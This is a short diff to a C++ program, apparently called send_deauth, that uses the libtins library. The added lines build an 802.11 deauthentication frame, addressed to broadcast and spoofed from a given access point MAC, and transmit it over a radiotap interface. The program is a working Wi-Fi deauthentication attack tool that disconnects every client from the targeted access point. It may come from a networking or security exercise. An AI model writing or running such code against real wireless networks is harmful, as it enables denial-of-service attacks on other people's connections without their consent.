@@ -7,7 +7,7 @@ using namespace Tins;
 int main(int argc, char *argv[])
 {
     string if_name;
-    HWAddress<6> ap_addr;
+    Dot11::address_type ap_addr;
     /*
      *  send_deauth <interce name> <ap mac> [<station mac>]
      */
@@ -15,7 +15,7 @@ int main(int argc, char *argv[])
     if(argc < 3){
         /* default option setting */
         if_name = "net0";
-        ap_addr = HWAddress<6>("00:07:89:32:0A:9F");
+        ap_addr = "00:07:89:32:0A:9F";
 
         cout << "send_deauth <interce name> <ap mac> [<station mac>]" << endl;
         //return 0;
@@ -24,8 +24,15 @@ int main(int argc, char *argv[])
         ap_addr = HWAddress<6>(argv[2]);
     }
 
-    cout << "if_name : " << if_name << endl;
-    cout << "ap_addr : " << ap_addr << endl;
+    /* make deauth packet*/
+    Dot11Deauthentication deauth(Dot11::BROADCAST, ap_addr);
+    deauth.addr3(ap_addr);
+
+    RadioTap tap = RadioTap() / deauth;
+
+    PacketSender sender;
+    NetworkInterface iface(if_name);
+    sender.send(tap, iface);
 
     return 0;
 }
